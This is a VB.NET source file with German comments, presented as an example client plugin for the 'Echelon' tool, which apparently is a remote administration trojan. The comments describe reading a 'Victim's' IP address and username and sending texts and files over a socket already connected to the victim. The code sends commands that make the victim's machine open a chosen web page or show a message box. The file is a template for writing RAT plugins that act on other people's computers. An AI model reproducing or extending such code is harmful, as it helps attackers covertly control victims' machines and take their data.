Public Class Form1
    '#####################################################################################################
    '                               -=Echelon Client PlugIn Beispiel=-
    'Mit der Victim Klasse können Informationen über das Vicitim ausgelesen, aber nicht verändert werden:
    'z.B. Victim.IpAdresse oder Victim.ComputerUsername .
    '
    'Mit dem VictimVerbindung Objekt können z.B. String zwischen Server- und Client PlugIn ausgetauscht werden.
    'z.B. VictimVerbindung.SendMessageToServerPlugIn("hallo") .
    '#####################################################################################################
    'Für die etwas fortgeschrittenen Programmierer:
    'Beim Starten des PlugIns werden Informationen mittels eines StringArrays übergeben. Die Getconnection
    'Methode übergibt einen TcpClient der .Net Sockets, welcher bereits mit dem Victim verbunden ist. Über
    'diesen Socket können Daten (z.B. Textte, Dateien) verschickt werden.
    '#####################################################################################################


    Public VictimVerbindung As VictimConnection

    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        AddHandler VictimVerbindung.Connected, AddressOf Verbunden
        AddHandler VictimVerbindung.ClientError, AddressOf Fehler
        AddHandler VictimVerbindung.NewMessage, AddressOf NeueNachricht
        Me.Show()
    End Sub

    Delegate Sub d1()
    Delegate Sub d2(ByVal sText As String)
    Delegate Sub d3(ByVal sText As String)
    Private Sub Verbunden()
        If Me.InvokeRequired Then
            Dim d As New d1(AddressOf Verbunden)
            Me.Invoke(d)
        Else
            Label2.Text = "verbunden" 'Die Verbindung zum ServerPlugIn wurde hergestellt.
        End If
    End Sub

    Private Sub Fehler(ByVal sError As String)
        If Me.InvokeRequired Then
            Dim d As New d3(AddressOf Fehler)
            Me.Invoke(d, New Object() {sError})
        Else
            Label2.Text = "Verbindung unterbrochen"
            Me.Close()
            VictimVerbindung.Close()
        End If
    End Sub

    Private Sub NeueNachricht(ByVal sNaricht As String)
        If Me.InvokeRequired Then
            Dim d As New d2(AddressOf NeueNachricht)
            Me.Invoke(d, New Object() {sNaricht})
        Else

            'Hier kommen die Nachrichten vom Victim an und können ausgewertet werden
            TextBox1.Text &= sNaricht & vbNewLine 'wir schreiben die Antwort vom Victim in die Testbox1
        End If
    End Sub

    Private Sub Button1_Click_1(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        'Mit   VictimVerbindung.SendMessageToServerPlugIn können Nachrichten an das Victim geschickt werden
        VictimVerbindung.SendMessageToServerPlugIn("Webseite öffnen|" & TextBox2.Text) 'schicke den Befehl an das Victim
    End Sub

    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.Click
        VictimVerbindung.SendMessageToServerPlugIn("MSG Box|" & TextBox3.Text & "|" & TextBox4.Text)
    End Sub
End Class